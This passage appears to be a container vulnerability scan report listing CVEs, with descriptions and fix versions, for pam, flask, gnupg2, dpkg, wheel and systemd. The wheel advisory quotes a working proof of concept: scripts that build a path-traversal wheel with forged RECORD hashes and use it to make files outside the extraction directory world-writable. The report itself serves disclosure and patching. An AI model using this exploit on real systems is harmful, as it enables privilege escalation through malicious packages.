<tr><td>Affected range</td><td><code><1.5.2-6+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>1.5.2-6+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.085%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>25th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

linux-pam (aka Linux PAM) before 1.6.0 allows attackers to cause a denial of service (blocked login process) via mkfifo because the openat call (for protect_dir) lacks O_DIRECTORY.

---
[experimental] - pam 1.5.3-2
- pam 1.5.3-4 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1061097)
[bookworm] - pam 1.5.2-6+deb12u2
[buster] - pam <no-dsa> (Minor issue)
https://www.openwall.com/lists/oss-security/2024/01/18/3
https://github.com/linux-pam/linux-pam/commit/031bb5a5d0d950253b68138b498dc93be69a64cb (v1.6.0)

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>flask</strong> <code>1.1.2</code> (pypi)</summary>

<small><code>pkg:pypi/flask@1.1.2</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2023-30861?s=github&n=flask&t=pypi&vr=%3C2.2.5"><img alt="high 8.7: CVE--2023--30861" src="https://img.shields.io/badge/CVE--2023--30861-lightgrey?label=high%208.7&labelColor=e25d68"/></a> <i>Use of Persistent Cookies Containing Sensitive Information</i>

<table>
<tr><td>Affected range</td><td><code><2.2.5</code></td></tr>
<tr><td>Fixed version</td><td><code>2.2.5</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.7</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.215%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>44th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When all of the following conditions are met, a response containing data intended for one client may be cached and subsequently sent by a proxy to other clients. If the proxy also caches `Set-Cookie` headers, it may send one client's `session` cookie to other clients. The severity depends on the application's use of the session, and the proxy's behavior regarding cookies. The risk depends on _all_ these conditions being met.

1. The application must be hosted behind a caching proxy that does not strip cookies or ignore responses with cookies.
2. The application sets [`session.permanent = True`](https://flask.palletsprojects.com/en/2.3.x/api/#flask.session.permanent).
2. The application does not access or modify the session at any point during a request.
4. [`SESSION_REFRESH_EACH_REQUEST`](https://flask.palletsprojects.com/en/2.3.x/config/#SESSION_REFRESH_EACH_REQUEST) is enabled (the default).
5. The application does not set a `Cache-Control` header to indicate that a page is private or should not be cached.

This happens because vulnerable versions of Flask only set the `Vary: Cookie` header when the session is accessed or modified, not when it is refreshed (re-sent to update the expiration) without being accessed or modified.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-27205?s=github&n=flask&t=pypi&vr=%3C3.1.3"><img alt="low 2.3: CVE--2026--27205" src="https://img.shields.io/badge/CVE--2026--27205-lightgrey?label=low%202.3&labelColor=fce1a9"/></a> <i>Use of Cache Containing Sensitive Information</i>

<table>
<tr><td>Affected range</td><td><code><3.1.3</code></td></tr>
<tr><td>Fixed version</td><td><code>3.1.3</code></td></tr>
<tr><td>CVSS Score</td><td><code>2.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.014%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>3rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When the `session` object is accessed, Flask should set the `Vary: Cookie` header. This instructs caches not to cache the response, as it may contain information specific to a logged in user. This is handled in most cases, but some forms of access such as the Python `in` operator were overlooked.

The severity depends on the application's use of the session, and the cache's behavior regarding cookies. The risk depends on all these conditions being met.

1. The application must be hosted behind a caching proxy that does not ignore responses with cookies.
2. The application does not set a `Cache-Control` header to indicate that a page is private or should not be cached.
3. The application accesses the session in a way that does not access the values, only the keys, and does not mutate the session.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>gnupg2</strong> <code>2.2.40-1.1</code> (deb)</summary>

<small><code>pkg:deb/debian/gnupg2@2.2.40-1.1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-68973?s=debian&n=gnupg2&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.2.40-1.1%2Bdeb12u2"><img alt="high : CVE--2025--68973" src="https://img.shields.io/badge/CVE--2025--68973-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.2.40-1.1+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>2.2.40-1.1+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.023%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In GnuPG before 2.4.9, armor_filter in g10/armor.c has two increments of an index variable where one is intended, leading to an out-of-bounds write for crafted input. (For ExtendedLTS, 2.2.51 and later are fixed versions.)

---
- gnupg2 2.4.8-5 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1124221)
[trixie] - gnupg2 2.4.7-21+deb13u1
[bookworm] - gnupg2 2.2.40-1.1+deb12u2
https://gpg.fail/memcpy
https://dev.gnupg.org/T7906
https://www.openwall.com/lists/oss-security/2025/12/28/5
https://github.com/gpg/gnupg/commit/115d138ba599328005c5321c0ef9f00355838ca9 (gnupg-2.5.14)
https://github.com/gpg/gnupg/commit/4ecc5122f20e10c17172ed72f4fa46c784b5fb48 (gnupg-2.4.9)
https://github.com/gpg/gnupg/commit/1e929abd20fa2e4be3797a137caca63a971d5372 (gnupg-2.2.51)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2022-3219?s=debian&n=gnupg2&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2022--3219" src="https://img.shields.io/badge/CVE--2022--3219-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.022%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GnuPG can be made to spin on a relatively small input by (for example) crafting a public key with thousands of signatures attached, compressed down to just a few KB.

---
- gnupg2 <unfixed> (unimportant)
https://bugzilla.redhat.com/show_bug.cgi?id=2127010
https://dev.gnupg.org/D556
https://dev.gnupg.org/T5993
https://www.openwall.com/lists/oss-security/2022/07/04/8
GnuPG upstream is not implementing this change.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>dpkg</strong> <code>1.21.22</code> (deb)</summary>

<small><code>pkg:deb/debian/dpkg@1.21.22?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-6297?s=debian&n=dpkg&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.21.23"><img alt="high : CVE--2025--6297" src="https://img.shields.io/badge/CVE--2025--6297-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.21.23</code></td></tr>
<tr><td>Fixed version</td><td><code>1.21.23</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.265%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>50th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

It was discovered that dpkg-deb does not properly sanitize directory permissions when extracting a control member into a temporary directory, which is documented as being a safe operation even on untrusted data. This may result in leaving temporary files behind on cleanup. Given automated and repeated execution of dpkg-deb commands on adversarial .deb packages or with well compressible files, placed inside a directory with permissions not allowing removal by a non-root user, this can end up in a DoS scenario due to causing disk quota exhaustion or disk full conditions.

---
- dpkg 1.22.21
[bookworm] - dpkg 1.21.23
[bullseye] - dpkg <postponed> (Minor issue)
Fixed by: https://git.dpkg.org/cgit/dpkg/dpkg.git/commit/?id=ed6bbd445dd8800308c67236ba35d08004c98e82 (main)
Fixed by: https://git.dpkg.org/cgit/dpkg/dpkg.git/commit/?id=98c623c8d6814ae46a3b30ca22e584c77d47d86b (1.22.21)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-2219?s=debian&n=dpkg&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.21.23"><img alt="low : CVE--2026--2219" src="https://img.shields.io/badge/CVE--2026--2219-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.21.23</code></td></tr>
<tr><td>Fixed version</td><td><code>1.21.23</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.025%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>8th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

It was discovered that dpkg-deb (a component of dpkg, the Debian package management system) does not properly validate the end of the data stream when uncompressing a zstd-compressed .deb archive, which may result in denial of service (infinite loop spinning the CPU).

---
- dpkg 1.23.6 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1129722)
[trixie] - dpkg 1.22.22
[bookworm] - dpkg 1.21.23
[bullseye] - dpkg <not-affected> (Vulnerable code introduced later)
Introduced with: https://git.dpkg.org/cgit/dpkg/dpkg.git/commit/?id=2c2f7066bd8c3209762762fa6905fa567b08ca5a (1.21.18)
Fixed by: https://git.dpkg.org/cgit/dpkg/dpkg.git/commit/?id=6610297a62c0780dd0e80b0e302ef64fdcc9d313 (1.23.6)

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>wheel</strong> <code>0.44.0</code> (pypi)</summary>

<small><code>pkg:pypi/wheel@0.44.0</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-24049?s=github&n=wheel&t=pypi&vr=%3E%3D0.40.0%2C%3C%3D0.46.1"><img alt="high 7.1: CVE--2026--24049" src="https://img.shields.io/badge/CVE--2026--24049-lightgrey?label=high%207.1&labelColor=e25d68"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>

<table>
<tr><td>Affected range</td><td><code>>=0.40.0<br/><=0.46.1</code></td></tr>
<tr><td>Fixed version</td><td><code>0.46.2</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.1</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.015%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>3rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
 - **Vulnerability Type:** Path Traversal (CWE-22) leading to Arbitrary File Permission Modification.  
 - **Root Cause Component:** wheel.cli.unpack.unpack function.  
 - **Affected Packages:**  
   1. wheel (Upstream source)  
   2. setuptools (Downstream, vendors wheel)  
 - **Severity:** High (Allows modifying system file permissions).  

### Details  
The vulnerability exists in how the unpack function handles file permissions after extraction. The code blindly trusts the filename from the archive header for the chmod operation, even though the extraction process itself might have sanitized the path.  
```
# Vulnerable Code Snippet (present in both wheel and setuptools/_vendor/wheel)
for zinfo in wf.filelist:
    wf.extract(zinfo, destination)  # (1) Extraction is handled safely by zipfile

    # (2) VULNERABILITY:
    # The 'permissions' are applied to a path constructed using the UNSANITIZED 'zinfo.filename'.
    # If zinfo.filename contains "../", this targets files outside the destination.
    permissions = zinfo.external_attr >> 16 & 0o777
    destination.joinpath(zinfo.filename).chmod(permissions)
```  

### PoC  
I have confirmed this exploit works against the unpack function imported from setuptools._vendor.wheel.cli.unpack.  

**Prerequisites:** pip install setuptools  

**Step 1: Generate the Malicious Wheel (gen_poc.py)**  
This script creates a wheel that passes internal hash validation but contains a directory traversal payload in the file list.  
```
import zipfile
import hashlib
import base64
import os

def urlsafe_b64encode(data):
    """
    Helper function to encode data using URL-safe Base64 without padding.
    Required by the Wheel file format specification.
    """
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')

def get_hash_and_size(data_bytes):
    """
    Calculates SHA-256 hash and size of the data.
    These values are required to construct a valid 'RECORD' file,
    which is used by the 'wheel' library to verify integrity.
    """
    digest = hashlib.sha256(data_bytes).digest()
    hash_str = "sha256=" + urlsafe_b64encode(digest)
    return hash_str, str(len(data_bytes))

def create_evil_wheel_v4(filename="evil-1.0-py3-none-any.whl"):
    print(f"[Generator V4] Creating 'Authenticated' Malicious Wheel: {filename}")

    # 1. Prepare Standard Metadata Content
    # These are minimal required contents to make the wheel look legitimate.
    wheel_content = b"Wheel-Version: 1.0\nGenerator: bdist_wheel (0.37.1)\nRoot-Is-Purelib: true\nTag: py3-none-any\n"
    metadata_content = b"Metadata-Version: 2.1\nName: evil\nVersion: 1.0\nSummary: PoC Package\n"
   
    # 2. Define Malicious Payload (Path Traversal)
    # The content doesn't matter, but the path does.
    payload_content = b"PWNED by Path Traversal"

    # [ATTACK VECTOR]: Target a file OUTSIDE the extraction directory using '../'
    # The vulnerability allows 'chmod' to affect this path directly.
    malicious_path = "../../poc_target.txt"

    # 3. Calculate Hashes for Integrity Check Bypass
    # The 'wheel' library verifies if the file hash matches the RECORD entry.
    # To bypass this check, we calculate the correct hash for our malicious file.
    wheel_hash, wheel_size = get_hash_and_size(wheel_content)
    metadata_hash, metadata_size = get_hash_and_size(metadata_content)
    payload_hash, payload_size = get_hash_and_size(payload_content)

    # 4. Construct the 'RECORD' File
    # The RECORD file lists all files in the wheel with their hashes.
    # CRITICAL: We explicitly register the malicious path ('../../poc_target.txt') here.
    # This tricks the 'wheel' library into treating the malicious file as a valid, verified component.
    record_lines = [
        f"evil-1.0.dist-info/WHEEL,{wheel_hash},{wheel_size}",
        f"evil-1.0.dist-info/METADATA,{metadata_hash},{metadata_size}",
        f"{malicious_path},{payload_hash},{payload_size}",  # <-- Authenticating the malicious path
        "evil-1.0.dist-info/RECORD,,"
    ]
    record_content = "\n".join(record_lines).encode('utf-8')

    # 5. Build the Zip File
    with zipfile.ZipFile(filename, "w") as zf:
        # Write standard metadata files
        zf.writestr("evil-1.0.dist-info/WHEEL", wheel_content)
        zf.writestr("evil-1.0.dist-info/METADATA", metadata_content)
        zf.writestr("evil-1.0.dist-info/RECORD", record_content)

        # [EXPLOIT CORE]: Manually craft ZipInfo for the malicious file
        # We need to set specific permission bits to trigger the vulnerability.
        zinfo = zipfile.ZipInfo(malicious_path)
       
        # Set external attributes to 0o777 (rwxrwxrwx)
        # Upper 16 bits: File type (0o100000 = Regular File)
        # Lower 16 bits: Permissions (0o777 = World Writable)
        # The vulnerable 'unpack' function will blindly apply this '777' to the system file.
        zinfo.external_attr = (0o100000 | 0o777) << 16
       
        zf.writestr(zinfo, payload_content)

    print("[Generator V4] Done. Malicious file added to RECORD and validation checks should pass.")

if __name__ == "__main__":
    create_evil_wheel_v4()
```  

**Step 2: Run the Exploit (exploit.py)**  
```
from pathlib import Path
import sys

# Demonstrating impact on setuptools
try:
    from setuptools._vendor.wheel.cli.unpack import unpack
    print("[*] Loaded unpack from setuptools")
except ImportError:
    from wheel.cli.unpack import unpack
    print("[*] Loaded unpack from wheel")

# 1. Setup Target (Read-Only system file simulation)
target = Path("poc_target.txt")
target.write_text("SENSITIVE CONFIG")
target.chmod(0o400) # Read-only
print(f"[*] Initial Perms: {oct(target.stat().st_mode)[-3:]}")

# 2. Run Vulnerable Unpack
# The wheel contains "../../poc_target.txt".
# unpack() will extract safely, BUT chmod() will hit the actual target file.
try:
    unpack("evil-1.0-py3-none-any.whl", "unpack_dest")
except Exception as e:
    print(f"[!] Ignored expected extraction error: {e}")

# 3. Check Result
final_perms = oct(target.stat().st_mode)[-3:]
print(f"[*] Final Perms: {final_perms}")

if final_perms == "777":
    print("VULNERABILITY CONFIRMED: Target file is now world-writable (777)!")
else:
    print("[-] Attack failed.")
```  

**result:**  
<img width="806" height="838" alt="image" src="https://github.com/user-attachments/assets/f750eb3b-36ea-445c-b7f4-15c14eb188db" />  
  
### Impact  
Attackers can craft a malicious wheel file that, when unpacked, changes the permissions of critical system files (e.g., /etc/passwd, SSH keys, config files) to 777. This allows for Privilege Escalation or arbitrary code execution by modifying now-writable scripts.  

### Recommended Fix  
The unpack function must not use zinfo.filename for post-extraction operations. It should use the sanitized path returned by wf.extract().  

### Suggested Patch:  
```
# extract() returns the actual path where the file was written
extracted_path = wf.extract(zinfo, destination)

# Only apply chmod if a file was actually written
if extracted_path:
    permissions = zinfo.external_attr >> 16 & 0o777
    Path(extracted_path).chmod(permissions)
```

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 5" src="https://img.shields.io/badge/M-5-fbb552"/> <img alt="low: 4" src="https://img.shields.io/badge/L-4-fce1a9"/> <!-- unspecified: 0 --><strong>systemd</strong> <code>252.30-1~deb12u2</code> (deb)</summary>

<small><code>pkg:deb/debian/systemd@252.30-1~deb12u2?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-4105?s=debian&n=systemd&ns=debian&t=deb&osn=debian&osv=12&vr=%3C252.39-1%7Edeb12u2"><img alt="medium : CVE--2026--4105" src="https://img.shields.io/badge/CVE--2026--4105-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><252.39-1~deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>252.39-1~deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.010%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in systemd. The systemd-machined service contains an Improper Access Control vulnerability due to insufficient validation of the class parameter in the RegisterMachine D-Bus (Desktop Bus) method. A local unprivileged user can exploit this by attempting to register a machine with a specific class value, which may leave behind a usable, attacker-controlled machine object. This allows the attacker to invoke methods on the privileged object, leading to the execution of arbitrary commands with root privileges on the host system.

---
- systemd 260~rc3-1
[trixie] - systemd 257.13-1~deb13u1
[bookworm] - systemd 252.39-1~deb12u2
https://github.com/systemd/systemd/security/advisories/GHSA-4h6x-r8vx-3862
Introduced with: https://github.com/systemd/systemd/commit/fbe550738d03b178bb004a1390e74115e904118a (v225)
Fixed by: https://github.com/systemd/systemd/commit/6df5f80bd374be1b45c52d740e88f0236da922c7 (v260-rc3)
Fixed by: https://github.com/systemd/systemd/commit/497d0172416cbb5b70f96b95399d041407c223bd (v259.4)
Fixed by: https://github.com/systemd/systemd/commit/6941d92dc299667036cbe264435971cec59ebc76 (v257.12)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-40226?s=debian&n=systemd&ns=debian&t=deb&osn=debian&osv=12&vr=%3C252.39-1%7Edeb12u2"><img alt="medium : CVE--2026--40226" src="https://img.shields.io/badge/CVE--2026--40226-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><252.39-1~deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>252.39-1~deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.009%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In nspawn in systemd 233 through 259 before 260, an escape-to-host action can occur via a crafted optional config file.

---
- systemd 260~rc3-1
[trixie] - systemd 257.13-1~deb13u1
[bookworm] - systemd 252.39-1~deb12u2
https://github.com/systemd/systemd/security/advisories/GHSA-9mj4-rrc3-gjcx
Fixed by: https://github.com/systemd/systemd/commit/61bceb1bff4b1f9c126b18dc971ca3e6d8c71c40 (v260-rc3)
Fixed by: https://github.com/systemd/systemd/commit/7b85f5498a958e5bb660c703b8f4a71cceed3373 (v260-rc3)
Fixed by: https://github.com/systemd/systemd/commit/773fd3b6e72e6c83cbb1cfc1cb20f3793db8649a (v257.12)
Fixed by: https://github.com/systemd/systemd/commit/bfa0a842822c4f79da9d47f8a773fd128d8f8a0a (v257.12)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-40225?s=debian&n=systemd&ns=debian&t=deb&osn=debian&osv=12&vr=%3C252.39-1%7Edeb12u2"><img alt="medium : CVE--2026--40225" src="https://img.shields.io/badge/CVE--2026--40225-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><252.39-1~deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>252.39-1~deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.037%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>12th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In udev in systemd before 260, local root execution can occur via malicious hardware devices and unsanitized kernel output.

---
- systemd 260~rc4-1
[trixie] - systemd 257.13-1~deb13u1
[bookworm] - systemd 252.39-1~deb12u2
https://github.com/systemd/systemd/security/advisories/GHSA-vpfq-8p5f-jcqx
Fixed by: https://github.com/systemd/systemd/commit/16325b35fa6ecb25f66534a562583ce3b96d52f3 (v260-rc3)
Fixed by: https://github.com/systemd/systemd/commit/54f880b02ecf7362e630ffc885d1466df6ee6820 (v260-rc4)
Fixed by: https://github.com/systemd/systemd/commit/03bb697b8df0339c37f4b845025320b261aeb7cc (v257.12)
Fixed by: https://github.com/systemd/systemd/commit/5887e72ff87d3a66a4c3fa91897fbec1545f4d3d (v257.13)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-29111?s=debian&n=systemd&ns=debian&t=deb&osn=debian&osv=12&vr=%3C252.39-1%7Edeb12u2"><img alt="medium : CVE--2026--29111" src="https://img.shields.io/badge/CVE--2026--29111-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><252.39-1~deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>252.39-1~deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.026%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>8th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

systemd, a system and service manager, (as PID 1) hits an assert and freezes execution when an unprivileged IPC API call is made with spurious data. On version v249 and older the effect is not an assert, but stack overwriting, with the attacker controlled content. From version v250 and newer this is not possible as the safety check causes an assert instead. This IPC call was added in v239, so versions older than that are not affected. Versions 260-rc1, 259.2, 258.5, and 257.11 contain patches. No known workarounds are available.

---
- systemd 260~rc2-1
[trixie] - systemd 257.13-1~deb13u1
[bookworm] - systemd 252.39-1~deb12u2
https://github.com/systemd/systemd/security/advisories/GHSA-gx6q-6f99-m764
Fixed by: https://github.com/systemd/systemd/commit/42aee39107fbdd7db1ccd402a2151822b2805e9f (v260-rc2)
Fixed by: https://github.com/systemd/systemd/commit/efa6ba2ab625aaa160ac435a09e6482fc63bdbe8 (v260-rc2)
Fixed by: https://github.com/systemd/systemd/commit/20021e7686426052e3a7505425d7e12085feb2a6 (v257.11)
Fixed by: https://github.com/systemd/systemd/commit/7ac3220213690e8a8d6d2a6e81e43bd1dce01d69 (v257.11)
Fixed by: https://github.com/systemd/systemd/commit/21167006574d6b83813c7596759b474f56562412 (v257.11)
Fixed by: https://github.com/systemd/systemd/commit/54588d2dedff54bfb6036670820650e4ea74628f (v257.11)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-4598?s=debian&n=systemd&ns=debian&t=deb&osn=debian&osv=12&vr=%3C252.38-1%7Edeb12u1"><img alt="medium : CVE--2025--4598" src="https://img.shields.io/badge/CVE--2025--4598-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><252.38-1~deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>252.38-1~deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.112%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>30th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in systemd-coredump. This flaw allows an attacker to force a SUID process to crash and replace it with a non-SUID binary to access the original's privileged process coredump, allowing the attacker to read sensitive data, such as /etc/shadow content, loaded by the original process.  A SUID binary or process has a special type of permission, which allows the process to run with the file owner's permissions, regardless of the user executing the binary. This allows the process to access more restricted data than unprivileged users or processes would be able to. An attacker can leverage this flaw by forcing a SUID process to crash and force the Linux kernel to recycle the process PID before systemd-coredump can analyze the /proc/pid/auxv file. If the attacker wins the race condition, they gain access to the original's SUID process coredump file. They can read sensitive content loaded into memory by the original binary, affecting data confidentiality.

---
- systemd 257.6-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1106785)
https://www.qualys.com/2025/05/29/apport-coredump/apport-coredump.txt
For a comprehensive fix a kernel change is required (to hand a pidfd to the usermode
coredump helper):
https://git.kernel.org/linus/b5325b2a270fcaf7b2a9a0f23d422ca8a5a8bdea
Backports (src:linux):
https://lore.kernel.org/linux-fsdevel/CAMw=ZnT4KSk_+Z422mEZVzfAkTueKvzdw=r9ZB2JKg5-1t6BDw@<!-- -->mail.gmail.com/
Fixed by: https://github.com/systemd/systemd/commit/49f1f2d4a7612bbed5211a73d11d6a94fbe3bb69 (main)
Fixed by: https://github.com/systemd/systemd/commit/0c49e0049b7665bb7769a13ef346fef92e1ad4d6 (main)
Fixed by: https://github.com/systemd/systemd/commit/8fc7b2a211eb13ef1a94250b28e1c79cab8bdcb9 (main)
Follow up (optional): https://github.com/systemd/systemd/commit/13902e025321242b1d95c6d8b4e482b37f58cdef (main)
Follow up (optional): https://github.com/systemd/systemd/commit/868d95577ec9f862580ad365726515459be582fc (main)
Follow up (optional): https://github.com/systemd/systemd/commit/e6a8687b939ab21854f12f59a3cce703e32768cf (main)
Follow up (optional): https://github.com/systemd/systemd/commit/76e0ab49c47965877c19772a2b3bf55f6417ca39 (main)
Follow up (optional): https://github.com/systemd/systemd/commit/9ce8e3e449def92c75ada41b7d10c5bc3946be77 (main)
Fixed by: https://github.com/systemd/systemd/commit/0c49e0049b7665bb7769a13ef346fef92e1ad4d6 (v258)
Fixed by: https://github.com/systemd/systemd/commit/868d95577ec9f862580ad365726515459be582fc (v258)
Fixed by: https://github.com/systemd/systemd/commit/c58a8a6ec9817275bb4babaa2c08e0e35090d4e3 (v257.6)
Fixed by: https://github.com/systemd/systemd/commit/61556694affa290c0a16d48717b3892b85622d96 (v257.6)
Fixed by: https://github.com/systemd/systemd/commit/19d439189ab85dd7222bdd59fd442bbcc8ea99a7 (v256.16)
Fixed by: https://github.com/systemd/systemd-stable/commit/254ab8d2a7866679cee006d844d078774cbac3c9 (v255.21)
Fixed by: https://github.com/systemd/systemd-stable/commit/7fc7aa5a4d28d7768dfd1eb85be385c3ea949168 (v254.26)
Fixed by: https://github.com/systemd/systemd-stable/commit/19b228662e0fcc6596c0395a0af8486a4b3f1627 (v253.33)
Fixed by: https://github.com/systemd/systemd-stable/commit/2eb46dce078334805c547cbcf5e6462cf9d2f9f0 (v252.38)
Issue relates to race condition exploitable while checking if a user should
be allowed to read a core file or not via the grant_user_access() function,
which was introduced as part of the fix for CVE-2022-4415.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-31439?s=debian&n=systemd&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2023--31439" src="https://img.shields.io/badge/CVE--2023--31439-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.138%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>34th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in systemd 253. An attacker can modify the contents of past events in a sealed log file and then adjust the file such that checking the integrity shows no error, despite modifications. NOTE: the vendor reportedly sent "a reply denying that any of the finding was a security vulnerability."

---
- systemd <unfixed> (unimportant)
Disputed by upstream
https://github.com/kastel-security/Journald/blob/main/journald-publication.pdf

</blockquote>
</details>

